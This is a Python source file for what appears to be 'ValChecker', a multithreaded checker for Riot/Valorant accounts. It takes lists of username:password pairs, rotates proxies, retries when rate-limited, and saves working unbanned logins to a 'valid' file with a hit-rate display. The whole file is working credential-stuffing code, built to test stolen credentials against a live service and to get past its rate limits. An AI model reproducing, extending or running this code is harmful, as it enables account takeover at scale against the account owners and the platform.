import os
from codeparts import stuff, systems,auth
from datetime import datetime
import threading
import time
import traceback
from colorama import Fore
import ctypes

syst=systems.system()
stff=stuff.staff()
class fastcheck:
    def __init__(self,accounts,count,settings:list,proxylist,useragent:str) -> None:
        self.useragent = useragent
        self.accounts=accounts
        path = os.getcwd()
        self.parentpath=os.path.abspath(os.path.join(path, os.pardir))
        self.proxylist=proxylist
        self.inrlimit=0
        self.max_rlimits=settings['max_rlimits']
        self.rlimit_wait=settings['rlimit_wait']
        self.cooldown=int(settings['cooldown'])
        self.print_sys=bool(settings['print_sys'])
        self.esttime='N/A'
        self.newfolder=settings['new_folder']
        if self.newfolder=='True':
            dtnw=str(datetime.now()).replace(' ','_').replace(':','.')
            self.outpath=self.parentpath+f'/output/{dtnw}'
            os.mkdir(self.outpath)
        else:
            self.outpath=self.parentpath+'/output'
            
        self.cpm=0
        self.startedcount=0
        self.cpmtext=self.cpm

        self.checked=0
        self.valid=0
        self.banned=0
        self.tempbanned=0
        self.err=0
        self.rlimits=0
        self.retries=0
        self.unverifiedmail=0

        
        self.proxycount=len(proxylist) if self.proxylist is not None else 0

        self.count=count
        os.system('mode con: cols=120 lines=25')
        self.threadam=1
        input(f'0 threads; {self.proxycount} proxies (enter to start) >>>')
        self.threadam= self.threadam if 1000>self.threadam>0 else self.proxycount if self.proxycount > 1 else 3

    def main(self):

        self.startedtesting=syst.getmillis()
        num=0
        self.printinfo()
        if self.threadam==1:
            for account in self.accounts:
                us=account.split(':')[0]
                ps=account.split(':')[1]
                self.checker(us,ps)
            return
        while True:
            if threading.active_count() <= self.threadam:
                if len(self.accounts)>num:
                    try:
                        us=self.accounts[num].split(':')[0]
                        ps=self.accounts[num].split(':')[1]
                    
                        threading.Thread(target=self.checker,args=(us,ps)).start()
                        #self.printinfo()
                        num+=1
                    except Exception:
                        print("Checked all")

    
    def checker(self,username:str,password:str):
        riotlimitinarow=0
        proxy=syst.getproxy(self.proxylist)
        account=f'{username}:{password}'
        authenticate=auth.auth(self.useragent)
        while True:
            try:
                token,entt,uuid,mailverif,banuntil=authenticate.auth(account,proxy=proxy)
                #token=authenticate.access_token
                #entt=authenticate.entitlements_token
                #mailverif=authenticate.mailverif
                #uuid=authenticate.user_id
                #banuntil=authenticate.banuntil
                if banuntil is not None:
                    banuntil=stff.checkban(banuntil)
                if token == 2:
                    with open(f'{self.parentpath}/log.txt','a') as f:
                        f.write(f'({datetime.now()}) {mailverif}\n_________________________________\n')
                    self.err+=1
                elif token==1:
                    if riotlimitinarow<self.max_rlimits:
                        if riotlimitinarow==0:
                            self.inrlimit+=1
                        #if self.print_sys==True:
                            print(syst.center(f'riot limit. waiting {self.rlimit_wait} seconds'))
                        time.sleep(self.rlimit_wait)
                        riotlimitinarow+=1
                        continue
                    else:
                        #if self.print_sys==True:
                        print(syst.center(f'{self.max_rlimits} riot limits in a row. skipping'))
                        self.inrlimit-=1
                        riotlimitinarow=0
                        self.rlimits+=1
                        self.checked+=1
                        self.printinfo()
                        with open (f'{self.parentpath}/output/riot_limits.txt', 'a', encoding='UTF-8') as file:
                            file.write(f'\n{account}')
                        break
                elif token==6:
                    if mailverif is True:
                        proxy=syst.getproxy(self.proxylist)
                    self.retries+=1
                    time.sleep(1)
                    continue
                elif token==3:
                    self.printinfo()
                    self.checked+=1
                    break
                elif token==0:
                    self.printinfo()
                    self.checked+=1
                    break
                elif token==4:
                    self.banned+=1
                elif token==5:
                    self.retries+=1
                    time.sleep(1)
                    continue
                else:
                    self.valid+=1
                    if mailverif is True and banuntil is None:
                        self.unverifiedmail+=1
                    
                    if banuntil is None:
                        with open(f'{self.outpath}\\fastcheck_valid.txt','a',encoding='utf-8') as f:
                            f.write(account+'\n')
            except Exception:
                with open(f'{self.parentpath}/log.txt','a',errors='replace',encoding='utf-8') as f:
                    f.write(f'({datetime.now()}) {str(traceback.format_exc())}\n_________________________________\n')
                self.err+=1
            self.checked+=1
            if riotlimitinarow >0:
                self.inrlimit-=1
            riotlimitinarow=0
            self.printinfo()
            time.sleep(self.cooldown)
            break

    def printinfo(self):
        # get cpm
        finishedtesting=syst.getmillis()
        if finishedtesting-self.startedtesting>60000:
            prevcpm=self.cpm
            self.cpm=self.checked-self.startedcount
            self.startedtesting=syst.getmillis()
            self.startedcount=self.checked
            self.cpmtext = f'↑ {self.cpm}' if self.cpm>prevcpm else f'↓ {self.cpm}'
            self.esttime=syst.convert_to_preferred_format(round((self.count-self.checked)/self.cpm*60))
        reset = Fore.RESET
        cyan = Fore.CYAN
        green = Fore.LIGHTGREEN_EX
        red = Fore.LIGHTRED_EX
        space = " "
        percent=self.valid/self.checked*100 if self.checked !=0 else 0
        percent=f'{str(round(percent,1))}%'
        ctypes.windll.kernel32.SetConsoleTitleW(f'ValChecker by liljaba1337  |  Checked {self.checked}/{self.count}  |  {self.cpmtext} CPM  |  Hitrate {percent}  |  Est. time: {self.esttime}')
        os.system('cls')
        print(f'''
    {reset}
    {syst.center('https://github.com/LIL-JABA/valchecker')}

        Proxies: {cyan}{self.proxycount}{reset} | Threads:  {cyan}{self.threadam}{reset} | Accounts: {cyan}{self.count}{reset} | Checked {Fore.YELLOW}{self.checked}{reset}/{Fore.YELLOW}{self.count}{reset}
        {syst.progressbar(self.checked,self.count)}
    {reset}
                                {Fore.MAGENTA} ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
                                {Fore.MAGENTA} ┃{reset}{Fore.MAGENTA}[{Fore.WHITE}>{Fore.MAGENTA}] {reset}Valid:         {Fore.MAGENTA}{green}{self.valid}{Fore.MAGENTA}{space*(19-len(str(self.valid)))}┃
                                {Fore.MAGENTA} ┃{reset}{Fore.MAGENTA}[{Fore.WHITE}>{Fore.MAGENTA}] {reset}Riot Limits:   {Fore.MAGENTA}{red}{self.rlimits}{Fore.MAGENTA}{space*(19-len(str(self.rlimits)))}┃
                                {Fore.MAGENTA} ┃{reset}{Fore.MAGENTA}[{Fore.WHITE}>{Fore.MAGENTA}] {reset}Errors:        {Fore.MAGENTA}{Fore.YELLOW}{self.err}{Fore.MAGENTA}{space*(19-len(str(self.err)))}┃
                                {Fore.MAGENTA} ┃{reset}{Fore.MAGENTA}[{Fore.WHITE}>{Fore.MAGENTA}] {reset}Retries:       {Fore.MAGENTA}{Fore.BLUE}{self.retries}{Fore.MAGENTA}{space*(19-len(str(self.retries)))}┃
                                {Fore.MAGENTA} ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛ 
        ''')